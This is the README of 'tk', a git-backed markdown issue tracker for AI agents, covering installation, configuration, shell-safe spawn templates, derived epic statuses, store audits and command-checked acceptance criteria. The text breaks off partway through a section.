# ticket

A git-backed issue tracker for AI agents. Rooted in the Unix Philosophy, `tk` is inspired by Joe Armstrong's [Minimal Viable Program](https://joearms.github.io/published/2014-06-25-minimal-viable-program.html) with additional quality of life features for managing and querying against complex issue dependency graphs.

Tickets are markdown files with YAML frontmatter stored in a central repository. This allows AI agents to easily search them for relevant content without dumping ten thousand character JSONL lines into their context window.

## Install

### Homebrew (macOS / Linux)

```bash
brew install EnderRealm/tools/ticket
```

To upgrade after a new release:

```bash
brew update                        # fetch latest tap metadata
brew upgrade ticket
```

### From source

Requires Go 1.25+.

```bash
git clone https://github.com/EnderRealm/ticket.git
cd ticket
go build -o ~/.local/bin/tk .
```

## Build

Local development:

```bash
go build -o tk .
```

Release builds inject the version via ldflags:

```bash
go build -ldflags "-X github.com/EnderRealm/ticket/v8/cmd.Version=8.0.0" -o tk .
```

Dev builds (`go build` with no ldflags) automatically show the git commit and dirty state via `runtime/debug.ReadBuildInfo`:

```
tk version
# dev (a1b2c3d, dirty)
```

## Getting Started

After installing, initialize from any project directory:

```bash
# First project — creates central store and registers the project
cd ~/code/myproject
tk init --central-root ~/code/forge-data/tickets
```

On a second machine, point at the same repo:

```bash
# Clone the repo that holds your tickets
git clone git@github.com:YourOrg/forge-data.git ~/code/forge-data

# Initialize and register projects
cd ~/code/myproject
tk init --central-root ~/code/forge-data/tickets
```

Subsequent projects on the same machine just need `tk init` (central root is remembered).

## Configuration

Config lives in `~/.ticket/config.yaml` (created by `tk init`):

```yaml
central_root: /Users/you/code/forge-data/tickets
git_email: tk@local
git_name: tk
sync_interval: 5s
verify_allow:
    - go
    - make
projects:
    myproject:
        path: /Users/you/code/myproject
        verify_timeout: 5m
```

Shared project registry (store type, auto_link, auto_close, etc.) is stored in `<central_root>/config.yaml` and synced via git alongside tickets — see [Commit Journal](#commit-journal) for what the two auto flags decide.

`verify_allow` lists the programs `tk verify` may run — see [Verifiable Acceptance Criteria](#verifiable-acceptance-criteria). It is read from this local file only; a `verify_allow` in the shared config is ignored.

`verify_timeout` bounds each of that project's verify commands, as a Go duration (`300s`, `5m`); unset it defaults to 120s. It is read from this local file only too, and a value that is not a positive duration refuses every verify command in the project rather than falling back to the default.

`--repo` accepts a registered project name or a repository path and overrides
project resolution for a single command. Project names resolve through the
configured path first, before the value is treated as a filesystem path.

### Where tickets live

Every command resolves one way: the repo — the configured path for a project name passed to `--repo`, a path passed to `--repo`, or else the working directory — to the project that repo owns in `<central_root>/tickets/<project>/`. There is no second kind of store. A repo that owns no project is an error naming it rather than a store minted on the spot, since a directory nothing else reads would orphan whatever landed there; `tk init` registers the project.

tk no longer reads a `.tickets/` directory inside a repo. Nothing deletes or rewrites one — if a repo still has it, the error names that directory, and `tk init` imports the tickets into the central store and leaves the original in place as a backup. The import goes through the same validating boundary every write passes, as one batch: a child resolves against the epic beside it, a file that does not parse names itself and stops the migration, a batch the graph refuses (a child naming a parent that exists nowhere) leaves the central store untouched, and a catalog requiring a feature this binary lacks refuses it like any other write. Tickets the central store already holds are skipped, so re-running `tk init` is harmless; the summary reports `imported:` and `skipped:` counts.

### `spawn_command`

The TUI `w` keybinding (see below) launches a `/work <id>` session, and `c` launches a `/brainstorm <idea>` session that hands off to `/capture` when the dialogue is done; both run the same `spawn_command` template, which decides the shell command, executed with `sh -c`. Like `verify_allow`, it is read from `~/.ticket/config.yaml` only — a `spawn_command` in the shared config is ignored, and `TK_STORE_ROOT` does not relocate it — because the template *is* the code that runs as you. The command runs with the selected ticket's checkout as its working directory, so a template that never interpolates `{dir}` still lands there; `{dir}` is for a template that opens a new window or shell, which starts wherever that program decides and needs the `cd`. These placeholders are substituted:

- `{dir}` — the checkout registered on this machine for the *selected ticket's* project (absolute path): the `path` recorded for that project in your local config, resolved per spawn through the same rule `tk verify` uses. It is never the board's directory: a child of another project reached through an epic's detail spawns in its own checkout. A Root ticket has no repository, and a project registered here without a path has no checkout, so the spawn is refused on the status line before any process is created
- `{id}` — the namespaced ticket ID (e.g. `myproject/tk-...`); empty for a capture, which has no ticket yet
- `{project}` — the selected ticket's project name, not the board's; for a capture, the project the idea is captured into
- `{title}` — the ticket title, sanitized like `{wtitle}` (still caller-quoted, like `{dir}`); for a capture, the idea
- `{wtitle}` — the computed window name `PROJECT -- ID4 -- TITLE` (uppercased project, the ticket's 4-char id suffix, and the title truncated to 20 characters; sanitized so it embeds without escaping); `PROJECT -- capture -- IDEA` for a capture
- `{command}` — the slash command the session opens on: `/work <id>` for `w`, `/brainstorm <idea>` for `c`. The idea is typed into the TUI and sanitized exactly like `{title}`, so `{command}` takes the same quoting a title does. A template with no `{command}` — one written before it existed, hard-coding `/work {id}` — still serves `w` unchanged, since the placeholder simply never fires, and refuses `c` on the status line, since it has nowhere to put the capture

The template runs through `sh -c`, and a ticket ID is a filename in the central store that another machine may have pushed, so both ticket-derived placeholders are constrained before they reach it. `{id}` must be letters, digits, `.`, `-` or `_`, plus at most one `/` for the project namespace, and each segment must start with a letter or digit — that covers everything `tk` generates (letters, digits and `-`, always opening with one) and the hand-named IDs already in stores (`ghostwheel/g-101.2`), while refusing `..` and an ID like `--flag` that a template would hand its program as an option rather than a ticket. Anything else refuses the spawn, naming the ID on the status line; the ticket stays usable everywhere else. Letters and digits are Unicode categories, not an ASCII range, so an ID slugged from a title in any script spawns normally. Quote `{id}` where your template interpolates it, the same as `{title}` and `{dir}`: the shape rule bounds the character set and the leading character, but quoting is what makes the placeholder safe wherever it lands.

`{title}` and `{wtitle}` are free text — an apostrophe in a title is ordinary, not an attack — so they are sanitized rather than refused: quotes, backslashes, `$`, backticks, `!`, control characters and the invisible Unicode format characters become spaces, since `$` and a backtick would otherwise expand in the interactive shell the default template types its command into, `!` would trigger its history expansion (which double quotes do not suppress, and which kills the line outright when no history event matches), and a bidi override makes a title render as something other than what runs. Sanitizing removes what would break a *quoting layer*, not everything that is shell syntax — `;`, `&`, `|` and `>` survive in a title — so a custom template must still quote `{title}` where it interpolates it, exactly as it must `{dir}`.

Watch which quotes you mean. In a `write text` payload the quotes you see are AppleScript's, not the shell's — the default's outer `"..."` is consumed by AppleScript, and what reaches the interactive shell is the escaped `\"...\"`. That is why the default's `{wtitle}` is safe inside `printf \"...\" \"{wtitle}\"` and a placeholder dropped into the visible outer quotes would not be. The default template uses only `{wtitle}`. `{dir}` and `{project}` come from project resolution rather than the shared store — your local config, or the override root's config under `TK_STORE_ROOT` — but nothing on the way in bounds what they may contain, so they are constrained here too: a value carrying `'`, `"`, `\`, `$`, a backtick, `!`, or a control or invisible format character refuses the spawn, naming the reason on the status line. Neither is ever rewritten to fit — replacing a character in a path changes which directory `cd` reaches, so the value passes through verbatim or not at all, and such a path has to be renamed rather than quoted around. The check sits at the boundary where the command is built, so a custom template does not lift it. Everything else, spaces included, passes as-is, and your template must still quote `{dir}` where it interpolates it.

When unset, the default opens a new iTerm window (macOS), names it `{wtitle}`, cds to the project, and starts Claude Code on the ticket:

```yaml
spawn_command: 'osascript -e ''tell application "iTerm"'' -e ''set w to (create window with default profile)'' -e ''tell current session of w to set name to "{wtitle}"'' -e ''tell current session of w to write text "cd '\''{dir}'\'' && printf \"\033]0;%s\007\" \"{wtitle}\" && export CLAUDE_CODE_DISABLE_TERMINAL_TITLE=1 && claude \"{command}\""'' -e ''end tell'''
```

The default creates the window with a normal interactive shell, names it so each worker is identifiable, and then types the command into it (via `write text`), so the window stays open and `claude` resolves on your `PATH`. It single-quotes `{dir}` so paths with spaces work; a project path containing a literal single quote can't be escaped inside the `osascript -e` wrapper at all, which is why such a path refuses the spawn instead of producing a command whose quoting it closes.

Making the title stick takes more than `set name`: the shell prompt (oh-my-zsh and similar set the title from a `preexec` hook) and Claude Code itself both overwrite it. So the default reasserts the title with a `printf` OSC-0 escape *after* the prompt hook fires, and `export`s `CLAUDE_CODE_DISABLE_TERMINAL_TITLE=1` so Claude Code doesn't keep rewriting the title during the session. The var is exported (not prefixed inline) because `claude` is often a shell alias — e.g. `tabset ...; command claude` — and an inline `VAR=1 claude` prefix would bind to the alias's first command rather than Claude. If you write a custom `spawn_command`, do the same if you want the title to persist.

Override to use a different terminal, e.g. tmux:

```yaml
spawn_command: 'tmux new-window -c {dir} "claude \"{command}\""'
```

## Agent Setup

Add this line to your `CLAUDE.md` or `AGENTS.md`:

```
This project uses a CLI ticket system for task management. Run `tk help` when you need to use it.
```

Claude Opus picks it up naturally from there. Other models may need additional guidance.

## Usage

Run `tk help` for the full command reference. Key commands:

```
Viewing:
  show <id> [--metadata]     Display ticket details. An epic ends with a
                             Progress section (children counted by status
                             across every namespace, and whether the count is
                             complete); a leaf whose parent does not make it a
                             child ends with a Relationship section saying why
  ls|list [filters]          List tickets (default: workflow grouped, done
                             and closed hidden; --all shows them)
    --all-projects           Every namespace in the central store, IDs qualified
    --parent=ID              Children of an epic: membership is global, the
                             listing is the selected project's (a "children of …"
                             line on stderr counts the rest); --all keeps closed ones
  frontier [--parent=ID]     List ready tickets with all deps done/closed,
                             computed over the whole store; --parent keeps that
                             epic's members, --project keeps one namespace's rows
  search <query>             Search tickets by relevance (best matches first)
    --all-projects           Search every namespace, IDs qualified
  audit [cause] [--project=NAME]
                             Summarise findings by cause, one line each with the count and the
                             command that lists that cause's tickets: invalid parents, epics whose
                             stored status is not read, tickets missing body content, tickets whose
                             acceptance criteria nothing can check, tickets storing a legacy Review
                             Log, files that cannot be read as tickets (exits non-zero), and files
                             whose id names another project. tk audit <cause> lists that cause's
                             tickets in full and nothing else; --json is the whole report either way
  verify <id>                Run the ticket's acceptance-criteria verify commands
                             in the checkout registered here for the ticket's own
                             project; a Root ticket, a project with no checkout
                             registered on this machine, and a missing checkout
                             are refused before anything runs
    --dir <path>             Run the commands in this directory instead of the
                             project's (applies only to an eligible run)
    --criterion <n>          Run only criterion n (1-based): exit 0 pass, 1 fail,
                             20 refused or unverified
    --no-record              Skip writing the Test Results section

Creating & Editing:
  create [title] [options]   Create ticket. Outside a registered project the
                             destination must be named: --project <namespace>
                             (--project _root for an idea with no repository
                             yet) or --repo
  edit <id> [options]        Update ticket fields
  add-note <id> [text]       Append timestamped note (stdin if no text)
  delete <id> [id...]        Delete ticket(s)
  move <id> <repo-path>      Move a ticket to another repo's ticket store
                             Only an isolated leaf moves; -r/--recursive is refused

Dependencies & Links:
  dep <id> <dep-id>          Add dependency
    --cargo "<what flows>"   Name what concretely flows across the edge ("" clears)
  undep <id> <dep-id>        Remove dependency
  dep tree [--full] <id>     Show dependency tree (marks edges with no cargo)
  link <id> <id> [id...]     Link tickets (symmetric)
  unlink <id> <target-id>    Remove link

Query:
  query [jq-filter]          Output tickets as JSONL (pipe to jq)
    --all-projects           Every namespace, IDs qualified

Setup:
  init [--project <name>] [--central-root <path>] [--yes]
                               Initialize tk and register a project; a
                               .tickets/ directory in the repo is imported
                               through the validating store boundary
  sync                         Sync ticket changes to git
  status                       Show tk system status

Global flags:
  --project <ns>             Operate on a namespace in the central store by
                             name (_root always selectable; unknown names
                             refused); conflicts with --repo
  --repo <name|path>         Operate on a registered project or repo
  --json                     Output in JSON format

Interactive:
  ui                         Terminal UI (--project _root browses Root)
  serve                      MCP server for AI agent integration

Journal:
  watch start [--interval=5s]  Start background git commit watcher
  watch stop                   Stop the background watcher
  watch status                 Show watcher status
  watch logs [-n 50]           Show watcher log output
  recompute [--project=NAME]   Rebuild commit journal from git history
```

### TUI Keybindings

The `tk ui` browser supports the usual navigation keys plus, in both the list and detail views:

| Key | Action |
|-----|--------|
| `y` | Yank (copy) the ticket ID to the clipboard |
| `w` | Spawn a `/work <id>` session in a new terminal, in the selected ticket's own checkout (see `spawn_command`); refused for an epic, a Root ticket, or a project with no checkout registered here |
| `c` | Prompt for a one-line idea, then spawn a `/brainstorm <idea>` session in a new terminal — in the board's project checkout from the list, the ticket's own from a detail — where Claude refines the idea one question at a time and hands off to `/capture` to create the ticket when you say you are done; `esc` cancels. Same `spawn_command` and the same refusals as `w`, plus a template with no `{command}` |
| `u` | Open the parent epic's full detail — every child in every namespace, closed ones included, with the counts its status was derived from — whichever project the epic lives in |

In an epic's detail, `enter` opens a picker over its children and opens the chosen one, foreign or not; `esc` returns to the detail it was opened from. A project board is a slice of a shared epic: the epics tab nests only the board's own children under it, and the group row carries the global count, done and closed separately, a `slice N of M local` marker when the board holds fewer than the epic has, and an `incomplete` marker when the store could not be read in full. `tk ui --project _root` browses Root without a checkout.

In the list view, `n` opens the create-ticket form (in a detail, `n` adds a note). Tab-specific status keys:

| Key | Action |
|-----|--------|
| `r` | Backlog tab: move ticket to ready |
| `b` | Inbox tab: move ticket to backlog |
| `x` | Inbox tab: mark ticket done |

### Statuses

Tickets use a simple status model:

| Status | Meaning |
|--------|---------|
| backlog | Waiting for grooming |
| ready | Available to work |
| open | Currently being worked on |
| done | Completed |
| closed | Not an issue, duplicate, etc. |

### Types

| Type | Purpose |
|------|---------|
| epic | Container for related features |
| feature | New functionality |
| bug | Defect fix |

The hierarchy is one level deep: a ticket's `parent` must name an epic in the same project, and an epic itself has no parent. `tk audit` reports tickets that break the rule.

### Epic Status

An epic's status is not set, it is computed from its children — all of them, in every namespace of the central store, before any project filter is applied. Once the catalog requires `cross-project-parents`, a leaf in any project may name an epic in any other as its parent, and the epic derives from the full set: a `tk ls` in one project shows that project's slice of the children, never a different status for the epic. Until the feature is required, a foreign parent is refused on write and a legacy file holding one is a relationship issue rather than a child.

References are read relative to the ticket that holds them: a bare `parent`, dep or link names the ticket's own project, and a qualified one names its own. Nothing searches other projects to interpret a bare reference, so identical bare IDs in two projects never join. New references are written qualified (`project/id`); references written before that stay as they are and keep meaning the local ticket.

| Children | Epic reads |
|----------|------------|
| `abandoned: true` and all children done or closed | closed |
| none | backlog |
| any child open | open |
| all done | done |
| all done or closed, at least one closed | closed |
| anything else | backlog |

`done` and `closed` say different things about a finished epic: `done` means the work completed, `closed` means it did not. An epic whose children were every one abandoned, or moved to another repo, reads `closed`.

An epic never reads `ready` — `ready` means "available to pick up" and an epic is not picked up directly. Setting an epic's status by hand is refused; change its children instead.

An epic's completion date is derived alongside its status: it is the date its last child reached a terminal state, and it is blank while the epic is not terminal. Nothing writes an epic when a child of it finishes, so `tk show`, `tk query` and the TUI's COMPLETED and DURATION columns read the children rather than a date on the epic's own file — an epic's file stores no completion date at all.

The one exception is abandoning an epic: `tk edit <epic> --status closed` records `abandoned: true` on the epic and closes every non-terminal child in the same action (children that already finished keep their `done`). The abandoned epic reads `closed` only while every child is terminal, so reopening one un-closes the epic until it finishes again. Setting any other status takes the abandon back, whatever the epic reads at the time. The children the abandon closed are reported with the edit — named on `tk edit`'s and the TUI's own line, returned by MCP `ticket_edit` as `closed_children` — so a write that mutated other tickets says so.

Changing a ticket's type to `epic` is judged the same way: `tk edit <id> --type epic` on its own is one ordinary edit and the status it carries back is not read as a decision, while a status set in the same call is a status set on the epic that edit makes — `closed` abandons it, anything else is refused.

Only a status a writer actually set counts as either decision: `tk edit --status`, the `status` argument to MCP `ticket_edit`, or the TUI edit form's status field cycled off the value it was opened with. A status that merely rode along with an edit to some other field is not a decision and is never judged as one — it can neither record an abandon nor be refused for disagreeing with the children. Writes tk makes on its own behalf express no intent either: `tk move` closes the ticket it left behind to record that it left, and the children staying behind are untouched, and a commit carrying `Closes: [<epic-id>]` closes nothing — the commit watcher skips epics with a warning, since an epic is closed by its children. An epic that moves is not closed in the source either: its file is left storing `backlog`, since a stored `closed` with no abandon flag beside it reads as a decision nobody took.

The intent lives in its own field because `status` on an epic is what every reader is shown and therefore what every edit carries back: an edit to a title or a note round-trips the flag unchanged, where it would otherwise drop or invent one. An epic's `status:` field is advisory — the derivation never reads it — so a value left there by an unrelated write means nothing.

Epics written before statuses were derived keep whatever `status` their file holds, and it is ignored: an epic closed by hand back then reads as its children imply until it is closed again. Nothing was migrated and no file was rewritten, so `tk audit` reports every epic that now reads a different status than its file stores. An epic whose file stores `closed` with no `abandoned` flag is listed separately as `stored-closed`: that is either a hand-close from before the change or a derived `closed` that some write carried into the file, and nothing in the file tells the two apart. Re-record the ones that should stay abandoned with `tk edit <id> --status closed` — and do it before editing those epics, because the stored value is the only surviving trace of the decision and the next write of the epic replaces it with the derived one.

Neither class is confined to the migration, so the report does not empty out: every write of an epic stores the status it derived at that moment, which the next change to a child makes stale, and an epic that derived `closed` at the time of a write comes back as `stored-closed`. A stored value is evidence of a decision only on a file older than derived statuses; on a newer one it is an artifact, and closing the epic to "re-record" it would close a child nobody asked to close.

Deriving from the children means a child the store cannot read is a hole in the derivation. A mistyped value in a ticket's frontmatter costs that one field and nothing else, so long as the loss stays inside that ticket: `abandoned: maybe`, `priority: high` or a `created` that is not a date each drop their own field, and the ticket still lists and still counts toward its epic.

A leaf whose parent does not resolve, is not an epic, or is in another project before the feature is activated is not any epic's child and is not automatically runnable: `tk ready` and `tk frontier` leave it out, and the library reports why through `ticket.RelationshipIssue`. A missing parent is not treated as an active one.

`tk delete` refuses a ticket that any other ticket still names as its parent, a dep or a link, in any project, and `tk edit --type` refuses turning an epic into a leaf while it has children anywhere. Abandoning an epic (`--status closed`) still closes its unfinished children in its own project, but refuses while an unfinished child lives in another project, naming the affected IDs grouped by project — closing another repository's work is not something an edit here does invisibly. Every one of those, and a move, needs the whole store read: an unreadable file or namespace is not proof that nothing references the ticket, so the operation is refused naming the evidence that is missing. Repairs never need that proof — clearing a parent, removing a dep or link, editing text and changing a leaf's status all land on a partial store.

A file that yields no usable ticket cannot count. That covers broken YAML, frontmatter that never closes, and a top-level key repeated by a hand-resolved merge conflict — which YAML refuses before it decodes a single field — but also a *load-bearing* field the decode dropped, because that loss is about other tickets or about the derivation itself, and nothing on the ticket shows it: `parent: [epic-1111]` would leave the ticket silently outside its epic's children, `deps: notalist` would leave it reading unblocked in `tk ready` and `tk frontier`, and `type: [epic]` on an epic's own file would leave it typeless, so the derivation passes over it and it renders whatever stale status its file happens to store. An empty parent, dep list or type is a writer saying "none" and reads fine. Every listing that hits an unusable file warns and names it, and while one stands, no epic anywhere in the store reads `done` or `closed`, since the missing ticket could be any epic's child in any project — a project view still carries a failure in another project for that reason. Two files in one project claiming the same ID (`x.md` holding `id: x` beside `zz.md` holding `id: proj/x`) count the same way, as `duplicate-id`: neither answers a reference until the operator decides which is the ticket. So does a namespace that cannot be listed, or one the catalog names that has no directory. `tk audit` reports the same files as `skipped_files`, with `kind: unreadable`, and counts them as the `unreadable` cause, which `tk audit unreadable` lists; whichever form it is run in, it warns that the report is incomplete, in the same block that covers projects it could not read, and the epics in an affected project are reported against the degraded value, so the report never describes a store it read only in part as clean. It counts them as a finding of their own and exits non-zero, so a scripted audit fails on a file no listing yields; a file naming another project is read in full and leaves the exit code alone.

That warning goes to stderr, which an MCP client never sees, so the tools carry it in the response instead: `ticket_list`, `ticket_search` and `ticket_frontier` each return `skipped_files` naming every file skipped in the projects they read, with the reason. An entry marked `epic_status_degraded` — an unreadable file, a `duplicate-id`, a `namespace` that could not be read — is one that could be any epic's child in any project, so while it stands anywhere in the store, no epic anywhere reads `done` or `closed`; a project-scoped call carries such an entry from another project for that reason, and only an entry that degrades nothing, such as `foreign-namespace`, is scoped to the project asked for. `ticket_show` on such a file reports `ticket unreadable`, naming the file, rather than `ticket not found`: the ticket is there and the file needs repair, which is a different fix from creating it again.

A file's directory decides which project its ticket belongs to. Ticket files arrive over git, so a project directory can hold a file whose `id` field names another project. A stored namespace that agrees with the directory is redundant and is read as the bare ID — and what follows it has to be a ticket ID, since the namespace is split on the first separator only: `id: proj/a/b` and `id: proj/` yield no ticket at all, and count as unreadable files rather than as another project's, because a file claiming this project's namespace may be any local epic's child. A namespace that disagrees with the directory is a conflict no reader can settle, so the file is not read as that project's ticket at all — it is in no listing, `tk show`, `tk ready` and `tk blocked` never see it, and a bare reference to its ID stays unresolved rather than being answered by a ticket that belongs somewhere else. That was worst when the foreign namesake read `done`: a real blocker whose only match in the directory was such a file dropped out of `## Blockers` altogether and the ticket waiting on it looked ready. Every listing warns and names the file, and `tk audit` reports it as `skipped_files` with `kind: foreign-namespace`, separately from the unreadable ones, as the cause `tk audit foreign-namespace` lists — the audit read it in full, so it does not make the report incomplete, and it is no epic's child, so an epic that was counting it can now read `done`. Move the file to the project its `id` names, or fix the `id` field.

`tk audit` also reports tickets whose stored body is missing content it was meant to carry, in the two shapes an MCP write leaves behind. A section ending in a tool-call envelope fragment — a closing `description`, `parameter`, `invoke` or `function_calls` tag, bare or `antml:`-prefixed — is text that ran past its own parameter: the caller closed the parameter with the wrong tag, the tool-call parser consumed to the end of the call, and every argument after it was absorbed into this one value rather than stored. The `acceptance` a create call believed it sent is exactly what goes missing that way, which is the second shape: a ticket carrying a description with no acceptance criteria states no contract, and is one neither `/capture` nor `/work` accepts. Epics are excluded from that half — a container's children carry the contract — and the count is a census, so it includes finished tickets and backlog stubs alongside the open ones worth acting on. `ticket_create` and `ticket_edit` now refuse a fragment outright rather than storing it — sanitizing it away would leave the ticket just as uncontracted, minus the evidence — and `ticket_create` returns an `empty_acceptance_warning` when a description arrives with no acceptance beside it, a warning and not a refusal so stub-first flows still create.

The fragment check is anchored at the *tail* of a section, not a search for the tokens anywhere in it: a ticket may legitimately discuss this markup — the one that asked for the check does — and the corruption always leaves the envelope's terminator at the end of the value, because the parser consumed to the end of the call. Prose quoting a tag ends with its own quoting and passes.

`tk audit` also reports every ticket carrying acceptance criteria that have neither a `verify:` command nor an `unverifiable:` reason, as `bare-acceptance` with `bare`, the number of that ticket's criteria that carry neither. Such a criterion states what done means with nothing that can decide it, and the warning `tk create` and `ticket_create` print only reaches tickets not yet written. The ones already in the store were findable only by scanning it by hand, with a second reading of what "bare" means, and there are hundreds of them: most of the store predates the convention, so this class is a backlog rather than the handful the create-time warning holds back. `tk audit bare-acceptance` names every one rather than capping the list, because a bare criterion is repaired one ticket at a time and a capped list names none of the rest; `--project` is what scopes a store-wide run. There is no type exemption, unlike the empty-acceptance half above — an epic carries no contract of its own, but an epic that does state criteria and leaves them bare has the same gap — and a ticket with no acceptance section at all is not reported, since it has no criteria. The remedy is a `verify: <command>` line under each, or an `unverifiable: <reason>` line saying why no command can exist.

`tk audit` also reports every ticket whose file still stores a legacy `## Review Log` section, as `legacy-review-log` with the size of the section in bytes. v7 retired the review system and the parser has stripped that section out of the body on every read since, so the section survives only until something writes the ticket — a status change, a priority cycle, an added note — and until then a ticket's Review Log either exists or does not depending on whether anyone happened to touch it. Nothing is migrated and no file is rewritten: the audit lists what is still there, so clearing them is a decision taken once over a known set, and a write that drops one now warns, naming the ticket and the byte count. The content stays recoverable from the store's git history either way.

`tk audit` prints all of that as a summary: one line per cause, each carrying that cause's count and the command that lists its tickets — `epic-has-parent`, `parent-missing`, `parent-cycle`, `parent-not-epic`, `parent-cross-project`, `stored-closed`, `stale-status`, `envelope-fragment`, `empty-acceptance`, `bare-acceptance`, `legacy-review-log`, `unreadable`, `foreign-namespace`. The listings run to hundreds of lines on a real store — `bare-acceptance` alone is 605 and `legacy-review-log` 128 — which pushed the classes with the fewest findings, and the most to act on, off the top of the terminal, so each is reached on its own: `tk audit <cause>` prints that one cause's listing in full, uncapped, and nothing else. An unrecognised name is refused and exits non-zero, naming the valid ones. `--json` is unaffected by the argument and returns the whole report in either form, and a file that could not be read still exits non-zero in either.

### Verifiable Acceptance Criteria

Acceptance criteria live in the ticket's `## Acceptance Criteria` section as bullets. A criterion can declare the command that checks it on a following line indented by at least two spaces:

```markdown
## Acceptance Criteria

- Frontier excludes blocked tickets.
  verify: go test ./pkg/ticket -run TestFrontier
- The TUI redraws cleanly at 40 columns.
  unverifiable: needs a human at a terminal.
```

A criterion for which no runnable command can exist declares that instead, on a line of the same shape: `unverifiable: <reason>`. The two are what tell a contract gap from an honest one — a criterion nobody wrote a command for and one that cannot have a command both leave `verify:` absent, and only the marker distinguishes them. A criterion carrying both lines keeps its command; the reason is data and is never run.

A bullet carrying neither line is bare, and `tk create` and the `ticket_create` MCP tool report one at the moment it is written — the CLI on stderr, the tool in `bare_acceptance_criteria` (the texts) and `bare_acceptance_warning` (the remedy). It is a report and not a refusal: the ticket is created and its ID returned, so a batch filing path is never left unable to record one. The caller is the audience because it still holds the context the criteria came from and can re-send them with a line attached.

Every heading beginning `## Acceptance` opens that section, so a hand-written `## Acceptance Notes` block is part of it: its bullets are criteria too, appended after the earlier block's in body order. The section ends at the next `## ` heading of any kind, so bullets under an unrelated heading are not criteria. `tk verify`, `--criterion <n>` and the `acceptance_criteria` field the `ticket_show` MCP tool returns all read that one section, so the criterion index a consumer reads out of `ticket_show` is the one tk runs. The write matches that read: an acceptance edit (the `ticket_edit` MCP tool's `acceptance` argument) replaces every `## Acceptance*` block — including one sitting further down the body, after a `## Design` block — with the new text under a single `## Acceptance Criteria` heading where the first block was, leaving whatever sat between them in place. So no block is dropped by the write and none is left behind as stale text, and writing back the section `ticket_show` returned reproduces it rather than duplicating it. A heading counts only where it opens a line: a description naming `## Acceptance Criteria`, `## Test Results` or `## Notes` inline is prose, and an edit spans the real section rather than the mention.

`tk verify <id>` runs each declared command in the ticket's project directory (from the project's configured `path`, falling back to the working directory), sequentially, each bounded by the project's `verify_timeout` (120s when unset) — a command that overruns is a failure, and its recorded output names the bound that was applied and whether it came from the project's `verify_timeout` or from the default. Criteria with no `verify:` line are reported as `unverified`, not failed.

```bash
tk verify 5c4
# verifying nw-5c46 in /Users/you/code/myproject
# PASS (exit 0) Frontier excludes blocked tickets.
# UNVERIFIED The TUI redraws cleanly at 40 columns.
# 1 pass, 0 fail, 0 refused, 1 unverified
```

The command exits non-zero if any criterion failed or was refused, and records the run in the ticket's `## Test Results` section (replacing the previous record):

```
verify 2026-07-31T22:10:00Z: 1 pass, 0 fail, 0 refused, 1 unverified
- PASS (exit 0): Frontier excludes blocked tickets.
- UNVERIFIED: The TUI redraws cleanly at 40 columns.
```

`tk verify --json` and a completed `ticket_verify` MCP call return the same structured report, including each command's exit code and captured output (capped at 4KB per criterion). The MCP tool executes commands on the server host in the checkout registered for the ticket's project.

#### Long-running MCP verification

`ticket_verify` waits up to 10 seconds for commands. A quick run returns the existing report. A longer run returns `id`, `verification_id`, and `state: "running"` (or `"recording"` while saving a complete result). This is a pending job, not a verification result. Call `ticket_verify_status` with `verification_id` until terminal; each poll waits at most 10 seconds and never starts commands. On `state: "completed"`, its `report` is the exact report the quick path returns, including criterion failures, refusals, unverified criteria and any `record_error`. The ticket's Test Results contains the corresponding counts and criterion statuses. `completed` describes execution, not a passing contract: inspect the report.

A client request timeout or cancellation does not cancel the commands. If the start response was lost, recover this session's latest job with `ticket_verify_status` and the ticket `id`. Repeating `ticket_verify` while that ticket is active joins the job; after it finishes, a new `ticket_verify` intentionally starts another run. Use status for retrieval. Another session cannot join, inspect or cancel the job, or start the same ticket while it is active in this server.

`ticket_verify_cancel` accepts either `verification_id` or ticket `id` and returns immediately. Poll status while `cancelling`; `cancelled` has no report and leaves the previous Test Results unchanged. Once `recording` begins, the commands have finished and cancellation cannot retract their record. A runner error is terminal `failed` with an `error`, also without a report or ticket record. Repeated cancellation is safe. Neither status nor cancel accepts a directory, command, allow-list or timeout override.

Jobs belong to the MCP session, not to one request. Disconnect cancels running jobs and releases their results; restarting the server loses them too. `tk serve` drains verification workers before it exits, so their command supervision and any complete result being recorded finish before shutdown. The server holds at most 128 jobs and evicts the oldest finished ones when needed. Unknown, expired or foreign IDs return an error and never replay commands. The ticket's recorded Test Results remains durable, but captured command output and job lookup are session-local. Host-local command permissions, per-command timeouts and registered-checkout checks still apply at the start of each new run. On macOS and Linux, cancellation and timeout stop the verification process group, including ordinary child processes of build tools; the CLI forwards interrupt/termination signals to the same cleanup and leaves the previous record intact.

#### Running one criterion from a harness

Three flags let a harness drive a single check without a wrapper script:

- `--dir <path>` runs the commands in that directory instead of the project's configured path. The path is used as given; it must already exist and be a directory, or the run is a usage error before any command executes.
- `--criterion <n>` runs and reports only criterion `n`, counted from 1 in the order the criteria appear in the section — the same order `--json` reports them in. An `n` outside `1..count` is a usage error naming the count, and nothing runs. Without `--no-record`, the recorded `## Test Results` section is replaced by that one criterion's result, so a harness running criteria one at a time pairs the two flags.
- `--no-record` skips the write-back, so the ticket's `## Test Results` section is left exactly as it was.

The three are independent and compose: any combination behaves as each one does alone.

With `--criterion`, the exit code grades that one criterion: `0` it passed, `1` it failed, `20` it was refused or has no `verify:` line. `20` is weft's anchor-stage convention — "graded and refused, do not relaunch" — adopted rather than invented, so one documented integer replaces a wrapper script per harness. An unverified criterion is not a pass: it never ran, so it exits `20` alongside a refusal rather than `0`. Without `--criterion` the exit code is unchanged: `0`, or `1` on any failure or refusal across the whole run. A usage error — a `--dir` that is not an existing directory, a `--criterion` out of range — exits `1` like any other `tk` error, before anything runs.

```bash
tk verify 5c4 --dir /path/to/worktree --criterion 1 --no-record
```

The flags are CLI-only, and the `ticket_verify` MCP tool gains none of them: it still resolves its directory from project config and still records. An MCP caller's arguments are shaped by ticket content, and a sandboxed client with no shell of its own would gain reach it does not otherwise have; a CLI caller already has a shell and can run anything in any directory, so the flags widen nothing for it. `verify_allow` is still read from `~/.ticket/config.yaml` alone — no flag widens it, `--dir` does not relocate where it is read from, and `TK_STORE_ROOT` does not move it either.

#### What may run

A verify command is content: agents write ticket bodies, and bodies replicate to every machine over the shared store's git remote. Two rules keep that content from becoming code execution.

